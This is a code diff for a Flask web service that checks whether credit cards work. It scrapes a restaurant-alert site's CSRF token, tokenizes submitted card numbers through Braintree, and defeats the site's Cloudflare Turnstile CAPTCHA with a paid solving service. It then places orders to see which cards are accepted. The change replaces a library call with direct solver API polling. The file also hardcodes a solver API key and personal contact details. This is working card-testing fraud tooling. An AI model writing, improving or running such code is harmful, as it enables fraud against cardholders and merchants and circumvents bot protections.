@@ -3,24 +3,59 @@ import re
 import requests
 import base64
 import json
-import capsolver
+import time
 import os
 
 app = Flask(__name__)
 
-capsolver.api_key = os.environ.get('CAPSOLVER_API_KEY', 'CAP-36BF001B18A46AC00BC2C165F2D9CBAC993998A167516A0BC5543A6DD46464AF')
+CAPSOLVER_API_KEY = os.environ.get('CAPSOLVER_API_KEY', 'CAP-36BF001B18A46AC00BC2C165F2D9CBAC993998A167516A0BC5543A6DD46464AF')
 
-@app.route('/', methods=['GET', 'POST'])
+def solve_turnstile():
+    """Solve Cloudflare Turnstile using Capsolver API directly"""
+    
+    create_payload = {
+        "clientKey": CAPSOLVER_API_KEY,
+        "task": {
+            "type": "AntiTurnstileTaskProxyLess",
+            "websiteURL": "https://mousewatcher.com/orders",
+            "websiteKey": "0x4AAAAAAAZeM8EG-HBKlL4B",
+            "metadata": {"action": "order"}
+        }
+    }
+    
+    response = requests.post("https://api.capsolver.com/createTask", json=create_payload)
+    result = response.json()
+    
+    if result.get("errorId"):
+        raise Exception(f"Task creation failed: {result.get('errorDescription', 'Unknown error')}")
+    
+    task_id = result.get("taskId")
+    
+    for _ in range(30):
+        time.sleep(2)
+        get_payload = {
+            "clientKey": CAPSOLVER_API_KEY,
+            "taskId": task_id
+        }
+        response = requests.post("https://api.capsolver.com/getTaskResult", json=get_payload)
+        result = response.json()
+        
+        if result.get("status") == "ready":
+            return result.get("solution", {}).get("token")
+        elif result.get("status") == "failed":
+            raise Exception(f"Task failed: {result.get('errorDescription', 'Unknown error')}")
+    
+    raise Exception("Timeout waiting for captcha solution")
+
+@app.route('/', methods=['GET'])
 def home():
-    if request.method == 'GET':
-        return jsonify({
-            'status': 'active',
-            'endpoints': {
-                '/check': 'POST - Check credit card',
-                '/check?cc=XXXX|MM|YY|CVV': 'GET - Check credit card with query param'
-            }
-        })
-    return jsonify({'error': 'Use GET or POST with cc parameter'}), 400
+    return jsonify({
+        'status': 'active',
+        'endpoints': {
+            '/check': 'POST or GET with cc parameter',
+            'example': '/check?cc=4111111111111111|12|26|123'
+        }
+    })
 
 @app.route('/check', methods=['GET', 'POST'])
 def check_card():
@@ -38,7 +73,7 @@ def check_card():
         
         session = requests.Session()
         
-        response = session.get('https://mousewatcher.com', headers={
+        headers1 = {
             'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36',
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
             'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
@@ -50,12 +85,12 @@ def check_card():
             'sec-fetch-user': '?1',
             'sec-fetch-dest': 'document',
             'accept-language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-            'priority': 'u=0, i',
-        })
+        }
         
+        response = session.get('https://mousewatcher.com', headers=headers1)
         csrf_token = re.search(r'<meta name="csrf-token" content="([^"]+)"', response.text).group(1)
         
-        response = session.post('https://mousewatcher.com/orders/totals', headers={
+        headers2 = {
             'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36',
             'Accept': 'text/vnd.turbo-stream.html, text/html, application/xhtml+xml',
             'Content-Type': 'application/json',
@@ -70,10 +105,11 @@ def check_card():
             'sec-fetch-dest': 'empty',
             'referer': 'https://mousewatcher.com/',
             'accept-language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-            'priority': 'u=1, i',
-        }, json={'dates': ['2026-05-06']})
+        }
         
-        response = session.get('https://mousewatcher.com/orders/tokens', headers={
+        session.post('https://mousewatcher.com/orders/totals', headers=headers2, json={'dates': ['2026-05-06']})
+        
+        headers3 = {
             'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36',
             'sec-ch-ua-platform': '"Android"',
             'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
@@ -83,14 +119,14 @@ def check_card():
             'sec-fetch-dest': 'empty',
             'referer': 'https://mousewatcher.com/',
             'accept-language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-            'priority': 'u=1, i',
-        })
+        }
         
+        response = session.get('https://mousewatcher.com/orders/tokens', headers=headers3)
         jwt_token = response.json()['braintree_token']
         decoded = json.loads(base64.urlsafe_b64decode(jwt_token))
         auth = decoded['authorizationFingerprint']
         
-        response = requests.post('https://payments.braintree-api.com/graphql', headers={
+        headers4 = {
             'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36',
             'Content-Type': 'application/json',
             'sec-ch-ua-platform': '"Android"',
@@ -104,8 +140,9 @@ def check_card():
             'sec-fetch-dest': 'empty',
             'referer': 'https://assets.braintreegateway.com/',
             'accept-language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-            'priority': 'u=1, i',
-        }, json={
+        }
+        
+        json_data = {
             'clientSdkMetadata': {
                 'source': 'client',
                 'integration': 'dropin2',
@@ -125,22 +162,16 @@ def check_card():
                 },
             },
             'operationName': 'TokenizeCreditCard',
-        })
+        }
         
+        response = requests.post('https://payments.braintree-api.com/graphql', headers=headers4, json=json_data)
         tkn = response.json()['data']['tokenizeCreditCard']['token']
         
-        solution = capsolver.solve({
-            "type": "AntiTurnstileTaskProxyLess",
-            "websiteURL": "https://mousewatcher.com/orders",
-            "websiteKey": "0x4AAAAAAAZeM8EG-HBKlL4B",
-            "metadata": {"action": "order"}
-        })
-        
-        turnstile_token = solution['token']
+        turnstile_token = solve_turnstile()
         
         data = f'authenticity_token={csrf_token}&park=1&order[alert][restaurant_id]=297&order%5Balert%5D%5Balert_dates_attributes%5D%5B0%5D%5Bid%5D&order[alert][alert_dates_attributes][0][_destroy]=false&order[alert][alert_dates_attributes][0][date]=2026-05-06&order[alert][alert_dates_attributes][0][breakfast]=0&order[alert][alert_dates_attributes][0][lunch]=0&order[alert][alert_dates_attributes][0][dinner]=0&order[alert][alert_dates_attributes][0][dinner]=1&order[alert][alert_dates_attributes][0][dinner_has_range]=0&order[alert][alert_dates_attributes][0][dinner_party_size]=1&order%5Balert%5D%5Balert_dates_attributes%5D%5B1%5D%5Bid%5D&order[alert][alert_dates_attributes][1][_destroy]=false&order%5Balert%5D%5Balert_dates_attributes%5D%5B2%5D%5Bid%5D&order[alert][alert_dates_attributes][2][_destroy]=false&order[alert][email]=opdevildragon%40gmail.com&alert_phone=%28201%29+245-5464&order[alert][phone]=%2B12012455464&cf-turnstile-response={turnstile_token}&payment_nonce={tkn}&device_data=%7B%22correlation_id%22%3A%2238cfe742-91d5-4963-be3c-825f72b8%22%7D'
         
-        response = session.post('https://mousewatcher.com/orders', headers={
+        headers5 = {
             'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36',
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
             'Content-Type': 'application/x-www-form-urlencoded',
@@ -156,8 +187,9 @@ def check_card():
             'sec-fetch-dest': 'document',
             'referer': 'https://mousewatcher.com/',
             'accept-language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-            'priority': 'u=0, i',
-        }, data=data)
+        }
+        
+        response = session.post('https://mousewatcher.com/orders', headers=headers5, data=data)
         
         if '<div id="error_explanation">' in response.text:
             error_match = re.search(r'<label class="error">\s*(.*?)\s*</label>', response.text, re.DOTALL)
